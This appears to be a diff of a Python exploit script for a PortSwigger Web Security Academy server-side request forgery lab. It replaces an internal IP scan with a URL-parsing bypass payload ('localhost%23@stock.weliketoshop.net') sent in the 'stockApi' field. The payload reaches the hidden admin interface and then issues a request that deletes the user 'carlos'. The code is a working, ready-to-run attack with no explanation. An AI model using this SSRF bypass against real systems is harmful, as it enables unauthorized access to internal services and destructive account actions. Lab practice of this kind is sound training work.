@@ -2,27 +2,25 @@ import http.client
 import ssl
 import urllib.parse
 
+LAB_ID = "???"
+
 
 def POST_product_stock(
-        segment: int,
+        stockApi: str,
 ) -> http.client.HTTPResponse:
     method, path = 'POST', '/product/stock'
-    host, port = '???.web-security-academy.net', 443
+    host, port = f'{LAB_ID}.web-security-academy.net', 443
     headers = {
-        'user-agent': '???',
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.5',
-        'referer': 'https://???.web-security-academy.net/product?productId=1',
         'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://???.web-security-academy.net',
-        'cookie': 'session=???',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
         'te': 'trailers',
     }
     fields = {
-        'stockApi': f'http://192.168.0.{segment}:8080/admin',
+        'stockApi': stockApi,
     }
     body = urllib.parse.urlencode(fields)
     headers['Content-Length'] = str(len(body))
@@ -31,8 +29,16 @@ def POST_product_stock(
     return connection.getresponse()
 
 
-for i in range(2, 256):
-    response = POST_product_stock(i)
-    if response.status != 500:
-        print(i)
-        break
+domain = "localhost%23@stock.weliketoshop.net"
+response = POST_product_stock(f'http://{domain}/admin')
+
+print("admin interface:")
+print(f"status: {response.status}")
+for header, value in response.headers.items():
+    print(f"{header}: {value}")
+print(response.read().decode())
+
+delete_path = "/admin/delete?username=carlos"
+response = POST_product_stock(f'http://{domain}{delete_path}')
+if response.status == 200:
+    print("deleted user carlos")
